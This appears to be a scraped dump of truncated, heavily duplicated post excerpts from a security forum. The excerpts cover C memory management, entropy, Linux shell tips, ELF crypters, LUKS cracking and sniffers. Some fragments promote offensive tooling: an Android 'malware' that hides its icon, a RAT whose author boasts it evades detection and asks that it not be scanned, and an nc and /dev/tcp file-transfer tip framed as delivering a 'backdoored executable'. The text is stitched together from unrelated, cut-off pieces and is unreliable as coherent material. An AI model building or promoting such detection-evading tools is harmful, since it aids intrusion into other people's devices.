calls usually look like this (it all depen&hellip;", "Nice post @oaktree! Just a heads up from the realloc manpage The realloc() function returns a pointer to the newly allocated memory, which is suitably aligned for any kind of variable and may be different from ptr, or NULL if the request fails. realloc calls usually look like this (it all depen&hellip;", "Nice post @oaktree! Just a heads up from the realloc manpage The realloc() function returns a pointer to the newly allocated memory, which is suitably aligned for any kind of variable and may be different from ptr, or NULL if the request fails. realloc calls usually look like this (it all depen&hellip;", "The last two (1 and 2) articles covered the main differences between stack/heap as well as using arrays on the heap. Now, I\u2019m going to walk you guys through resizing these heap-allocated arrays. See, you might not always know \u2013 at compile time \u2013 how much memory you will need. Thus, we can write cod&hellip;", "That\u2019s completely right @oaktree thanks for the correction", "You are wicked smart! Thank you!!!  I love your ability to explain! \u201cIf you can\u2019t explain it simply, you don\u2019t understand it well enough.\u201d Albert Einstein", "Continuing the discussion from CAPTCHA - Randomness applicability: When I first discovered Information Theory many years ago I was amazed. The fact of being able to quantify the amount of information in a sequence of bits just looked awesome. So I would try to explain this as simpler as I can. Ther&hellip;", "Continuing the discussion from CAPTCHA - Randomness applicability: When I first discovered Information Theory many years ago I was amazed. The fact of being able to quantify the amount of information in a sequence of bits just looked awesome. So I would try to explain this as simpler as I can. Ther&hellip;", "Continuing the discussion from CAPTCHA - Randomness applicability: When I first discovered Information Theory many years ago I was amazed. The fact of being able to quantify the amount of information in a sequence of bits just looked awesome. So I would try to explain this as simpler as I can. Ther&hellip;", "Alright. Because I like doing these and find this topic to be \u201cokay\u201d, difficulty-wise, I\u2019m doing two articles in two days. This is Part 2.0, the followup to Part 1.0, which was about using malloc and free on pointers. In this article, we\u2019ll be using the same functions (malloc and free), but with ar&hellip;", "That\u2019s completely right @oaktree thanks for the correction", "OK Just one tiny correction: The log function only approaches 0 asymptotically. Thus, logx(0) does not exist for any x, but can be noted as -infinity.", "@0x00pf, I\u2019ve honestly started \u201cliking\u201d your articles before even reading them. I just expect them to be good.", "Fantastic explanation! Right when I was having my refresher in Information Theory for my uni exam, you drop this bomb article. It\u2019d be great to see some compression algos in the future (i.e Huffman, Shannon.)", "@0x00pf, I\u2019ve honestly started \u201cliking\u201d your articles before even reading them. I just expect them to be good.", "Continuing the discussion from CAPTCHA - Randomness applicability: When I first discovered Information Theory many years ago I was amazed. The fact of being able to quantify the amount of information in a sequence of bits just looked awesome. So I would try to explain this as simpler as I can. Ther&hellip;", "Continuing the discussion from CAPTCHA - Randomness applicability: When I first discovered Information Theory many years ago I was amazed. The fact of being able to quantify the amount of information in a sequence of bits just looked awesome. So I would try to explain this as simpler as I can. Ther&hellip;", "that sounds great\u2026 looking forward to that malware stuff!", "I agree completely with your statement, and this is probably the most important part of your article, well \u2026 from my point of view ! Moreover, to ensure a better memory management and avoid memories leaking, I advise using valgrind, tool sensible to memory usage issues !", "that sounds great\u2026 looking forward to that malware stuff!", "Love it mate ! I appreciate that you took the time to clarify the concept of entropy ! Very well explained with some self-explaining comparisons, simplifying the approach of such notion ! By the way, the Huffman algorithm is widely used in the area of malware classification too. It is a reliable al&hellip;", "Here is an explanation about how entropy is calculated ! https://asecuritysite.com/encryption/ent", "@pry0cc  In the context of randomness, the entropy defines with which extent a bit is tied to another within bytes. Higher is the entropy; lower is the relation between them. That is why it is expressed by a number, within a range from 0 to 8. As @_py described in his post above, entropy is affected&hellip;", "Continuing the discussion from CAPTCHA - Randomness applicability: When I first discovered Information Theory many years ago I was amazed. The fact of being able to quantify the amount of information in a sequence of bits just looked awesome. So I would try to explain this as simpler as I can. Ther&hellip;", "Continuing the discussion from CAPTCHA - Randomness applicability: When I first discovered Information Theory many years ago I was amazed. The fact of being able to quantify the amount of information in a sequence of bits just looked awesome. So I would try to explain this as simpler as I can. Ther&hellip;", "Alright! After receiving positive responses to my proposal, I\u2019m ready to start this [C] Dynamic Memory series. Here are some suggested prerequisites: Basic Understanding of Imperative ProgrammingBasic C Programming KnowledgeConfidence with PointersAnd what pointers representWhether or no&hellip;", "At some point, your C program is gonna grow. Maintaining all that code in just one file is painful. Even more, you may be using different libraries and typing all those flags every time you want to compile your program also becomes painful. When you get to that point, is time to Make and Split. Hel&hellip;", "Hi fellas, To continue with my CAPTCHA series, I will introduce you the concept of randomness and its applicability to the domain of CAPTCHA breaking with a deeper digression to cryptography, steganography and forensics. Without further ado, I would like to get to the heart of the matter by explai&hellip;", "Hey mates! Just wanted to share this awesome DEFCON talk I found, about how a hacker found where his stolen desktop was and completely pwned the person who stole it! It\u2019s pretty funny, and I\u2019m sure if you haven\u2019t seen it already you will enjoy it a lot! Link: https://www.youtube.com/watch?v=U4oB28&hellip;", "Your sentence is a bit broader I guess, but, in the context of the discussion in this post. Yes\u2026", "The way the .text section is interpreted depends on what the ELF header of the file says right? (ELF32 or ELF64)", "Great post as usual mate!", "Glad to hear it was useful!", "Hey guys! Check out this awful phishing attempt I received in my email! For OPSEC reasons, I\u2019ve changed any occurrence of my name to \u201cDoe.\u201d Yes, he addressed me by my last name. Subject: Dear Doe,Message:Dear Doe, I am Barrister Fredrick Adonko, a Legal adviser to my late clientMr.D.E.Doe,a &hellip;", "At some point, your C program is gonna grow. Maintaining all that code in just one file is painful. Even more, you may be using different libraries and typing all those flags every time you want to compile your program also becomes painful. When you get to that point, is time to Make and Split. Hel&hellip;", "Glad to hear it was useful!", "At some point, your C program is gonna grow. Maintaining all that code in just one file is painful. Even more, you may be using different libraries and typing all those flags every time you want to compile your program also becomes painful. When you get to that point, is time to Make and Split. Hel&hellip;", "Great stuff. I\u2019ll be implementing this soon in my bot project \u2013 no doubt. EDIT: Done! Worked like a charm! Thanks @0x00pf.", "Great stuff. I\u2019ll be implementing this soon in my bot project \u2013 no doubt. EDIT: Done! Worked like a charm! Thanks @0x00pf.", "Thanks for the tut! It was very helpful.", "At some point, your C program is gonna grow. Maintaining all that code in just one file is painful. Even more, you may be using different libraries and typing all those flags every time you want to compile your program also becomes painful. When you get to that point, is time to Make and Split. Hel&hellip;", "At some point, your C program is gonna grow. Maintaining all that code in just one file is painful. Even more, you may be using different libraries and typing all those flags every time you want to compile your program also becomes painful. When you get to that point, is time to Make and Split. Hel&hellip;", "At some point, your C program is gonna grow. Maintaining all that code in just one file is painful. Even more, you may be using different libraries and typing all those flags every time you want to compile your program also becomes painful. When you get to that point, is time to Make and Split. Hel&hellip;", "Good stuff @afiskon. Thanks!", "At some point, your C program is gonna grow. Maintaining all that code in just one file is painful. Even more, you may be using different libraries and typing all those flags every time you want to compile your program also becomes painful. When you get to that point, is time to Make and Split. Hel&hellip;", "At some point, your C program is gonna grow. Maintaining all that code in just one file is painful. Even more, you may be using different libraries and typing all those flags every time you want to compile your program also becomes painful. When you get to that point, is time to Make and Split. Hel&hellip;", "I really enjoyed this Defcon talk, because it\u2019s about something that we all see and use everyday, but probably take for granted. And yet, there is a whole world of interesting vulnerabilities and potential for exploitation attached. It\u2019s a good reminder to look for the stuff that hides in plain sigh&hellip;", "Here are just a few fresh security-related links from Twitter that look interesting: I Want to Know What Code Is Running Inside My BodyUDPack - An Extensible Generic UDP Packet ObfuscatorCertificate Bypass: Hiding and Executing Malware from a Digitally Signed Executable [PDF]AVLeak: Fingerprint&hellip;", "Thanks @unh0lys0da for the tutorial, found it nice and clear. Just wanted to say for anyone on a 64bit system(which is surely most of us by now?) you can still compile and link everything as 32 bit like so: nasm -f elf -o shell.o shell.asm &lt;&lt; no change here ld -m elf_i386 -o shell shell.o &lt;&lt; use &hellip;", "Whoa, such a great Post!!  I knew about the Android Shell, but not that I could recompile it.", "Do you know your Android phone have a shell?. Do you know that it is a reduced version of busybox?. Do you know you can recompile it and add some important missing applets? If you don\u2019t, keep reading. This is gonna be quick and easy! NOTE: This a rewrite of something I wrote some time ago for othe&hellip;", "Do you know your Android phone have a shell?. Do you know that it is a reduced version of busybox?. Do you know you can recompile it and add some important missing applets? If you don\u2019t, keep reading. This is gonna be quick and easy! NOTE: This a rewrite of something I wrote some time ago for othe&hellip;", "Do you know your Android phone have a shell?. Do you know that it is a reduced version of busybox?. Do you know you can recompile it and add some important missing applets? If you don\u2019t, keep reading. This is gonna be quick and easy! NOTE: This a rewrite of something I wrote some time ago for othe&hellip;", "Do you know your Android phone have a shell?. Do you know that it is a reduced version of busybox?. Do you know you can recompile it and add some important missing applets? If you don\u2019t, keep reading. This is gonna be quick and easy! NOTE: This a rewrite of something I wrote some time ago for othe&hellip;", "Do you know your Android phone have a shell?. Do you know that it is a reduced version of busybox?. Do you know you can recompile it and add some important missing applets? If you don\u2019t, keep reading. This is gonna be quick and easy! NOTE: This a rewrite of something I wrote some time ago for othe&hellip;", "Thanks mate!", "Do you know your Android phone have a shell?. Do you know that it is a reduced version of busybox?. Do you know you can recompile it and add some important missing applets? If you don\u2019t, keep reading. This is gonna be quick and easy! NOTE: This a rewrite of something I wrote some time ago for othe&hellip;", "Do you know your Android phone have a shell?. Do you know that it is a reduced version of busybox?. Do you know you can recompile it and add some important missing applets? If you don\u2019t, keep reading. This is gonna be quick and easy! NOTE: This a rewrite of something I wrote some time ago for othe&hellip;", "Do you know your Android phone have a shell?. Do you know that it is a reduced version of busybox?. Do you know you can recompile it and add some important missing applets? If you don\u2019t, keep reading. This is gonna be quick and easy! NOTE: This a rewrite of something I wrote some time ago for othe&hellip;", "Do you know your Android phone have a shell?. Do you know that it is a reduced version of busybox?. Do you know you can recompile it and add some important missing applets? If you don\u2019t, keep reading. This is gonna be quick and easy! NOTE: This a rewrite of something I wrote some time ago for othe&hellip;", "Do you know your Android phone have a shell?. Do you know that it is a reduced version of busybox?. Do you know you can recompile it and add some important missing applets? If you don\u2019t, keep reading. This is gonna be quick and easy! NOTE: This a rewrite of something I wrote some time ago for othe&hellip;", "You did it!. Very nice solution!", "You did it!. Very nice solution!", "Bump. Updated information.", "Some time ago, we explored the idea of a simple crypter for ELF files ( A simple Linux Crypter). In that post, we explored a simple technique to modify the code of a program at run-time. In that specific case to decrypt parts of the code that were crypted beforehand by an off-line tool. In this art&hellip;", "Notes on Security, Separation of Concerns and CVE-2016-1238 (Full Disclosure) Not very technical article per se, but it\u2019s still interesting and highlights an important topic.", "Ah I meant polymorphic code in malware. A bit off topic, but I bet you\u2019ll find it very interesting. I think I have some books and what not about somewhere, so I\u2019ll take a look.", "Ah I meant polymorphic code in malware. A bit off topic, but I bet you\u2019ll find it very interesting. I think I have some books and what not about somewhere, so I\u2019ll take a look.", "@oaktree no, I was not doing that. I will try. Thanks! @Cromical you mean polymorphic code as in malware or as in standard boring OOP stuff   . I\u2019m actually trying (not security related) so if you have references to share, that will be appreciated", "@oaktree no, I was not doing that. I will try. Thanks! @Cromical you mean polymorphic code as in malware or as in standard boring OOP stuff   . I\u2019m actually trying (not security related) so if you have references to share, that will be appreciated", "Some time ago, we explored the idea of a simple crypter for ELF files ( A simple Linux Crypter). In that post, we explored a simple technique to modify the code of a program at run-time. In that specific case to decrypt parts of the code that were crypted beforehand by an off-line tool. In this art&hellip;", "@oaktree no, I was not doing that. I will try. Thanks! @Cromical you mean polymorphic code as in malware or as in standard boring OOP stuff   . I\u2019m actually trying (not security related) so if you have references to share, that will be appreciated", "Nice, and thanks mate! Oh wait- have you tried polymorphic code yet?  It\u2019s very interesting!", "I think you are doing this, but I wanted to point it out clearly. Rather than decrypting the relevant code segments on the disk file (first, before re-crypting it), you simply XOR it with the new key and then XOR the old key with the new key accordingly. This is due to the properties of xor!", "Some time ago, we explored the idea of a simple crypter for ELF files ( A simple Linux Crypter). In that post, we explored a simple technique to modify the code of a program at run-time. In that specific case to decrypt parts of the code that were crypted beforehand by an off-line tool. In this art&hellip;", "Some time ago, we explored the idea of a simple crypter for ELF files ( A simple Linux Crypter). In that post, we explored a simple technique to modify the code of a program at run-time. In that specific case to decrypt parts of the code that were crypted beforehand by an off-line tool. In this art&hellip;", "Welcome back command-line ninjas, I wanted to take a small break from Trix\u2019 with Linux and decided to write myself a tool. I noticed nothing was really out that would give you a comprehensive overview of an IP, which is awesome for Recon, and being totally 1337  This tool is written in ruby and uti&hellip;", "Some time ago, we explored the idea of a simple crypter for ELF files ( A simple Linux Crypter). In that post, we explored a simple technique to modify the code of a program at run-time. In that specific case to decrypt parts of the code that were crypted beforehand by an off-line tool. In this art&hellip;", "Hey mates, again I translate @L3akM3-0day\u2019s code into C#. See the original article here . Hiding App IconMain activityusing System;using Android.App;using Android.Content;using Android.Runtime;using Android.Views;using Android.Widget;using Android.OS;using Android.Content.PM;namespace&hellip;", "Some time ago, we explored the idea of a simple crypter for ELF files ( A simple Linux Crypter). In that post, we explored a simple technique to modify the code of a program at run-time. In that specific case to decrypt parts of the code that were crypted beforehand by an off-line tool. In this art&hellip;", "Some time ago, we explored the idea of a simple crypter for ELF files ( A simple Linux Crypter). In that post, we explored a simple technique to modify the code of a program at run-time. In that specific case to decrypt parts of the code that were crypted beforehand by an off-line tool. In this art&hellip;", "Some time ago, we explored the idea of a simple crypter for ELF files ( A simple Linux Crypter). In that post, we explored a simple technique to modify the code of a program at run-time. In that specific case to decrypt parts of the code that were crypted beforehand by an off-line tool. In this art&hellip;", "Some time ago, we explored the idea of a simple crypter for ELF files ( A simple Linux Crypter). In that post, we explored a simple technique to modify the code of a program at run-time. In that specific case to decrypt parts of the code that were crypted beforehand by an off-line tool. In this art&hellip;", "Some time ago, we explored the idea of a simple crypter for ELF files ( A simple Linux Crypter). In that post, we explored a simple technique to modify the code of a program at run-time. In that specific case to decrypt parts of the code that were crypted beforehand by an off-line tool. In this art&hellip;", "Hey @afiskon sure you can. You have to issue event EV_KEY and provide the proper code. The value field, as far as I remember is used to press/release the key. You have to register all the keys you want to use though. One for each key, using ioctrl with the UI_SET_KEYBIT request . @Cromical Thanks&hellip;", "Let\u2019s put away the serious stuff for a while and let\u2019s have some fun. What about some hacking pranks!. Let\u2019s start with something simple, the so called nervous mouse. Note: The code is a modification of some example from internet. I cannot recall where I got it, but it is, let\u2019s say, the default ex&hellip;", "Great post as usual mate!", "Seems like it might be my solution to my computer sleeping when watching films xD  [image]", "Let\u2019s put away the serious stuff for a while and let\u2019s have some fun. What about some hacking pranks!. Let\u2019s start with something simple, the so called nervous mouse. Note: The code is a modification of some example from internet. I cannot recall where I got it, but it is, let\u2019s say, the default ex&hellip;", "Hey @afiskon sure you can. You have to issue event EV_KEY and provide the proper code. The value field, as far as I remember is used to press/release the key. You have to register all the keys you want to use though. One for each key, using ioctrl with the UI_SET_KEYBIT request . @Cromical Thanks&hellip;", "Hey @afiskon sure you can. You have to issue event EV_KEY and provide the proper code. The value field, as far as I remember is used to press/release the key. You have to register all the keys you want to use though. One for each key, using ioctrl with the UI_SET_KEYBIT request . @Cromical Thanks&hellip;", "Hey @afiskon sure you can. You have to issue event EV_KEY and provide the proper code. The value field, as far as I remember is used to press/release the key. You have to register all the keys you want to use though. One for each key, using ioctrl with the UI_SET_KEYBIT request . @Cromical Thanks&hellip;", "@0x00pf Wow! Very interesting, thanks a lot! I\u2019m guessing using similar technique you can \u201cpress buttons\u201d on a keyboard as well?", "Bloody hell, I\u2019m gonna have fun with this one . Nice job mate thanks for sharing!", "@0x00pf Wow! Very interesting, thanks a lot! I\u2019m guessing using similar technique you can \u201cpress buttons\u201d on a keyboard as well?", "Let\u2019s put away the serious stuff for a while and let\u2019s have some fun. What about some hacking pranks!. Let\u2019s start with something simple, the so called nervous mouse. Note: The code is a modification of some example from internet. I cannot recall where I got it, but it is, let\u2019s say, the default ex&hellip;", "Great post as usual mate!", "Let\u2019s put away the serious stuff for a while and let\u2019s have some fun. What about some hacking pranks!. Let\u2019s start with something simple, the so called nervous mouse. Note: The code is a modification of some example from internet. I cannot recall where I got it, but it is, let\u2019s say, the default ex&hellip;", "Let\u2019s put away the serious stuff for a while and let\u2019s have some fun. What about some hacking pranks!. Let\u2019s start with something simple, the so called nervous mouse. Note: The code is a modification of some example from internet. I cannot recall where I got it, but it is, let\u2019s say, the default ex&hellip;", "Let\u2019s put away the serious stuff for a while and let\u2019s have some fun. What about some hacking pranks!. Let\u2019s start with something simple, the so called nervous mouse. Note: The code is a modification of some example from internet. I cannot recall where I got it, but it is, let\u2019s say, the default ex&hellip;", "Let\u2019s put away the serious stuff for a while and let\u2019s have some fun. What about some hacking pranks!. Let\u2019s start with something simple, the so called nervous mouse. Note: The code is a modification of some example from internet. I cannot recall where I got it, but it is, let\u2019s say, the default ex&hellip;", "A Tumor Called MarlaHi everyone, today we will cover how to hide our malware from the user and run our malware as a service. When the Malware run for the first time it will hide the app icon from the user laucher, and run a service. The service only query the OS version for the moment, we will b&hellip;", "Great post as usual mate!", "Let\u2019s put away the serious stuff for a while and let\u2019s have some fun. What about some hacking pranks!. Let\u2019s start with something simple, the so called nervous mouse. Note: The code is a modification of some example from internet. I cannot recall where I got it, but it is, let\u2019s say, the default ex&hellip;", "Let\u2019s put away the serious stuff for a while and let\u2019s have some fun. What about some hacking pranks!. Let\u2019s start with something simple, the so called nervous mouse. Note: The code is a modification of some example from internet. I cannot recall where I got it, but it is, let\u2019s say, the default ex&hellip;", "Greetings, all. The following paper will be documenting an example of executable compression, AKA packers which I have developed over the past couple of days. Like crypters, I feel as though they are some form of hidden dark art of the underground communities. Though there are many publicly availabl&hellip;", "There could be material out there which discusses different \u201cflavours\u201d(?) of C like WinAPI but I learned it from reading the documentation and copy and pasting code from all over the internet (especially Stack Overflow). A lot of the code I couldn\u2019t understand at first but over time as I familiarize&hellip;", "Yep, this one won\u2019t get detected, but please don\u2019t upload to Virustotal or any other Scanner!!! I\u2019ll work on the RAT, add more commands (useful ones ) and then it may really can be used . At the moment it\u2019s a  skeletal structure for anyone, who needs an Android RAT, but doesn\u2019t want to build one ou&hellip;", "Using nc and bash cat file | nc -l 8000exec 5&lt;&gt; /dev/tcp/localhost/8000; cat 0&lt;&amp;5 &gt; file.txtAlso try woof But I always use the python way  Great and useful share BTW!", "Nice post mate. You are getting there. Love the name\u2026 the 100-eyed giant!", "Using nc and bash cat file | nc -l 8000exec 5&lt;&gt; /dev/tcp/localhost/8000; cat 0&lt;&amp;5 &gt; file.txtAlso try woof But I always use the python way  Great and useful share BTW!", "Nice introduction @pry0cc. My two cents The ~ is almost equivalent to $HOME: cd ~/Documentscd $HOME/Documents But what you can also do is to specify a username cd ~pico/DocumentsWill change directory to /home/pico/Documents or whatever other location the home directory is set for user pico. &hellip;", "A droplet of water shatters like glass upon your nose as the murky sky roars dominantly overhead. You gladly respect the sky gods\u2019 anger and continue picking up your pace since you\u2019ve still a while to go until you\u2019re home. 3:30 PM. Though it took you 20 minutes to jog home from school. Surprisingly&hellip;", "I personally use Syncthing and Nginx for this purpose", "Using nc and bash cat file | nc -l 8000exec 5&lt;&gt; /dev/tcp/localhost/8000; cat 0&lt;&amp;5 &gt; file.txtAlso try woof But I always use the python way  Great and useful share BTW!", "Using nc and bash cat file | nc -l 8000exec 5&lt;&gt; /dev/tcp/localhost/8000; cat 0&lt;&amp;5 &gt; file.txtAlso try woof But I always use the python way  Great and useful share BTW!", "Welcome back my trainee command-line ninjas! In this guide we will be covering some basic concepts and tricks to sending files to computers in the Linux shell. This can be extremely useful when you\u2019re trying to share a backdoored executable to a machine on the same network, but don\u2019t want to have t&hellip;", "Nice post mate. You are getting there. Love the name\u2026 the 100-eyed giant!", "I think someone could be interested in this: &quot; Large historyset history=1000&quot; Save bookmarks in ~/.viminfoset viminfo=&#39;1000,f1nmap &lt;C-n&gt; :set invnumber&lt;Enter&gt;&quot; wordwrap&quot; :set textwidth=79nmap &lt;C-p&gt; &lt;C-w&gt;&lt;C-]&gt;&lt;C-w&gt;Tcommand! CommitPush :!git commit -am fix ; git push origin HEADcommand!&hellip;", "Nice post mate. You are getting there. Love the name\u2026 the 100-eyed giant!", "Hey mates! After roughly 30 hours of work, I\u2019m now finished with my own Android Remote Administration Tool . It was my holiday project, which I planned several weeks before. Argus - RAT is of course named after the giant in the Greek mythology. But\u2026 I think that\u2019s not interesting for you . Let\u2019s di&hellip;", "Rather then urbandiktionary, a name like www.mircosoft.com is way harder to notice the error. Check the following sentence i wnet sohpping whit smoe freinds at the mall wihle tehre are spleling mistkaes its qutie easy to raed. This is because all the letters are in the words and the first and las&hellip;", "The material world is limited and can therefore be described by math. The spiritual world / mind however that is something we will find out after dead.", "would something like this fit the category ? telnet towel.blinkenlights.nl", "would something like this fit the category ? telnet towel.blinkenlights.nl", "Ah Starwars in good &#39;ol CMD! Good one!", "would something like this fit the category ? telnet towel.blinkenlights.nl", "would something like this fit the category ? telnet towel.blinkenlights.nl", "I think it is. If you look at it from the point of view of the Theory of Chaos. At the end the world is dynamic and non-linear despite of our efforts to linearise everything. We do that because we do not know yet how to deal with reality  Look at the logistic map ( https://en.wikipedia.org/wiki/Lo&hellip;", "I think it is. If you look at it from the point of view of the Theory of Chaos. At the end the world is dynamic and non-linear despite of our efforts to linearise everything. We do that because we do not know yet how to deal with reality  Look at the logistic map ( https://en.wikipedia.org/wiki/Lo&hellip;", "@falcon403 thanks for the explanation mate. I overlooked this part of your post", "@0x00pf: The password is not what\u2019s in memory. @falcon403 is using a memory dump to grab the hash of the password.", "@falcon403 thanks for the explanation mate. I overlooked this part of your post", "@0x00pf: In step one we are creating a LUKS device to test our skills on it. The password was only needed to create a filesystem inside the LUKS container. Whenever you start to open a LUKS device the hash gets loaded into the RAM, ready to authenticate passwords. You don\u2019t even have to input a pas&hellip;", "@0x00pf: The password is not what\u2019s in memory. @falcon403 is using a memory dump to grab the hash of the password.", "I may be too tired today, and certainly I\u2019m missing something\u2026 if you boot with a live USB, how does the LUKS password gets into memory? In step 1 you enter the password to create the crypted device. If after that you follow all your steps without rebooting, the password is indeed still in memory. &hellip;", "@0x00pf: I think you might be missing something out. I used a live USB, which is why I had root access. You don\u2019t need to have access to the main OS. But yes, you could \u2018trojanize\u2019 cryptsetup on the main OS but that would include RE I guess. Not my level of expertise yet. Or you could program a fal&hellip;", "Awesome post man. 1337 cred to you  I never considered this approach. I\u2019m guessing this would be a lot more tricky on a main HDD, and on a computer that wasn\u2019t on to when you found it. I look forward to seeing your other posts, they\u2019re very easy to read, good job!", "Nice post. Just one question. As you have root access (what you need to load the LKM) and you have to be on-line when the drive is mounted, why not just trojanize cryptsetup and get the password next time somebody mounts the drive?.. I know is not that cool but is there any other reason you can poi&hellip;", "Hello 0x00sec! Today in this article we\u2019ll be cracking a device encrypted with LUKS (Linux Unified Key Setup). Breaking LUKS encrypted devices (or any type of encrypted devices) are surprisingly easy if you know what you are doing. It\u2019s been some time since I joined 0x00sec so I thought it\u2019s about &hellip;", "So, you need an uplink. You fire up your WiFi scanning and see only WPA\u2019s around\u2026 There are multiple attack vectors available, but you know that a proper passphrase can take years to bruteforce, even with a GPU farm, and that the ISPs have started issuing routers with WPS protections. Dictionary at&hellip;", "Hello again. I know Fust3rCluck covered this, but I had something different in mind\u2026 XOR, or Exclusive XOR, is a Boolean Logic Gate. Like most of the other logic gates, XOR takes two parameters. Thus, it is a binary logic gate. [XOR truth table] XOR is a computationally easy form of encryption. H&hellip;", "Nice introduction @pry0cc. My two cents The ~ is almost equivalent to $HOME: cd ~/Documentscd $HOME/Documents But what you can also do is to specify a username cd ~pico/DocumentsWill change directory to /home/pico/Documents or whatever other location the home directory is set for user pico. &hellip;", "Great first article! I think XOR-encryption should be fundamental knowledge, so this post helps beginners a lot ;). I only recommend you to leave out using namespace std next time, because it\u2019s bad practice . See explanation here. Anyway, it looks like you\u2019ll post good stuff. What are your next ide&hellip;", "Hmmm perhaps you should be worried\u2026 What if they did arp spoofing and redirected your whole network through your box, and then was able to monitor your entire network.", "I\u2019m the only user so i\u2019m not concerned about that. I\u2019f someone gains access to my box there\u2019s a lot more things I should be worried about than my network settings.", "Do you want any user to be able to mess up your network?..", "Nice introduction @pry0cc. My two cents The ~ is almost equivalent to $HOME: cd ~/Documentscd $HOME/Documents But what you can also do is to specify a username cd ~pico/DocumentsWill change directory to /home/pico/Documents or whatever other location the home directory is set for user pico. &hellip;", "Nice introduction @pry0cc. My two cents The ~ is almost equivalent to $HOME: cd ~/Documentscd $HOME/Documents But what you can also do is to specify a username cd ~pico/DocumentsWill change directory to /home/pico/Documents or whatever other location the home directory is set for user pico. &hellip;", "Woah I did not know that! Awesome! That cd - is also something I\u2019ve never heard of. Nice share.", "Woah I did not know that! Awesome! That cd - is also something I\u2019ve never heard of. Nice share.", "Nice introduction @pry0cc. My two cents The ~ is almost equivalent to $HOME: cd ~/Documentscd $HOME/Documents But what you can also do is to specify a username cd ~pico/DocumentsWill change directory to /home/pico/Documents or whatever other location the home directory is set for user pico. &hellip;", "&#39;+ Elliot uses DeepSound, a steganography / encryption tool which creates alternate streams in audio files. So after obtaining a copy of the files (e.g. a CD data dump), you need to decrypt them too. &#39;+ Nice write up, mate!", "Hi there, Maybe I get you wrong, but shouldn\u2019t this 1 0 = 1 True True = false 0 0 = 0 False True = True be this? 1 0 = 1 True False = True 0 0 = 0 False False = False I think this table would fit in better here: Input        OutputA       B000011101110Best regards, Sm&hellip;", "Nice introduction @pry0cc. My two cents The ~ is almost equivalent to $HOME: cd ~/Documentscd $HOME/Documents But what you can also do is to specify a username cd ~pico/DocumentsWill change directory to /home/pico/Documents or whatever other location the home directory is set for user pico. &hellip;", "Welcome to Trix\u2019 with Linux, the first installment of this series! In this series you will become my trainee command-line ninjas and in this guide we will be covering basic Linux use. I will cover Ubuntu/Mint (these will also work for Kali). If you\u2019re using another distro and want help, just comment&hellip;", "We all mess around with our .bash*, *rc and .profile files, but sometimes we are not sure what the whole deal is about\u2026 This article from Linux Journal (posted 22 June &#39;16) does a good job of explaining the topic: https://www.linuxjournal.com/content/profiles-and-rc-files", "(This is a repost of the link given in the \u2018Linux Category Proposal\u2019. Reason: proper categorisation.) \u201cLearn the ways of Linux-fu, for free.\u201d https://linuxjourney.com/", "Just for fun. I adapted the technique from  this great article, to build a custom ELF 64 BITS 64        org 0x400000  ehdr:                                                 ; Elf32_Ehdr                db      0x7F, &quot;ELF&quot;, 2, 1, 1, 0         ;   e_ident        times 8 db      0                &hellip;", "Continuing the discussion from The Price of Scripting: There you go I\u00b4m sorry, but I\u2019m not going to implement the code challenger we used in The Price of Scripting in assembler\u2026 it is just no point on doing that. So I will use a simple hello world program that will wait for the user to press a key&hellip;", "@oaktree, there you go http://www.essrl.wustl.edu/~jao/itrg/shannon.pdf", "@oaktree, there you go http://www.essrl.wustl.edu/~jao/itrg/shannon.pdf", "Do you happen to have a link to the paper of which you speak, @0x00pf?", "Well, it is mainly know for being the father of \u201cInformation Theory\u201d and their theorems, despite of his works on cryptography. By the way, his original paper on Information Theory is just brilliant!. A must read!", "Just for fun. I adapted the technique from  this great article, to build a custom ELF 64 BITS 64        org 0x400000  ehdr:                                                 ; Elf32_Ehdr                db      0x7F, &quot;ELF&quot;, 2, 1, 1, 0         ;   e_ident        times 8 db      0                &hellip;", "Woah! Nice! I didn\u2019t expect you to be so prompt! @0x00pf really is a total badass!  Awesome!", "Woah! Nice! I didn\u2019t expect you to be so prompt! @0x00pf really is a total badass!  Awesome!", "Continuing the discussion from The Price of Scripting: There you go I\u00b4m sorry, but I\u2019m not going to implement the code challenger we used in The Price of Scripting in assembler\u2026 it is just no point on doing that. So I will use a simple hello world program that will wait for the user to press a key&hellip;", "Thanks mate! This clears a lot up", "I\u2019m not a good C++ programmer, but I heard using namespace std is bad practice. See here .", "Continuing the discussion from The Price of Scripting: There you go I\u00b4m sorry, but I\u2019m not going to implement the code challenger we used in The Price of Scripting in assembler\u2026 it is just no point on doing that. So I will use a simple hello world program that will wait for the user to press a key&hellip;", "Continuing the discussion from The Price of Scripting: There you go I\u00b4m sorry, but I\u2019m not going to implement the code challenger we used in The Price of Scripting in assembler\u2026 it is just no point on doing that. So I will use a simple hello world program that will wait for the user to press a key&hellip;", "Continuing the discussion from The Price of Scripting: There you go I\u00b4m sorry, but I\u2019m not going to implement the code challenger we used in The Price of Scripting in assembler\u2026 it is just no point on doing that. So I will use a simple hello world program that will wait for the user to press a key&hellip;", "Continuing the discussion from The Price of Scripting: There you go I\u00b4m sorry, but I\u2019m not going to implement the code challenger we used in The Price of Scripting in assembler\u2026 it is just no point on doing that. So I will use a simple hello world program that will wait for the user to press a key&hellip;", "Great article mate! Looked forward to something like this!", "Continuing the discussion from The Price of Scripting: There you go I\u00b4m sorry, but I\u2019m not going to implement the code challenger we used in The Price of Scripting in assembler\u2026 it is just no point on doing that. So I will use a simple hello world program that will wait for the user to press a key&hellip;", "In Part I we learnt how to write a very basic sniffer If you take a look to the code you will notice that, once we capture the packet, we have to do quite some checks in order to get to the data we are interested on. That is fine for a general packet capture tool like wireshark, were you want to se&hellip;", "You know the stuff mate!", "You know the stuff mate!", "In theory, this method is viable and easy to use however, it requires more information about the system in place. Anyway, detect a sniffer in stealth mode is a big deal, mainly, remotely. Yep, you are right, DNS tests, Network latency tests and trapping works only on active sniffers !  By the way&hellip;", "You are right, it is system dependant. However it does not look like a pain. The paper is very well written and self-explanatory\u2026 Doesn\u2019t look like there are much options. Some other tricks with bogus DNS queries (supposing the sniffer does name resolution) and time measurement\u2026 as far as I know", "In theory, this method is viable and easy to use however, it requires more information about the system in place. Anyway, detect a sniffer in stealth mode is a big deal, mainly, remotely. Yep, you are right, DNS tests, Network latency tests and trapping works only on active sniffers !  By the way&hellip;", "Well, it is mainly know for being the father of \u201cInformation Theory\u201d and their theorems, despite of his works on cryptography. By the way, his original paper on Information Theory is just brilliant!. A must read!", "Thanks for the information mate, I take note", "Well, it is mainly know for being the father of \u201cInformation Theory\u201d and their theorems, despite of his works on cryptography. By the way, his original paper on Information Theory is just brilliant!. A must read!", "Nice article @oaktree ! This crypto algorithm is inescapable. The vigenere cipher, also considered as a one-time pad, is one of 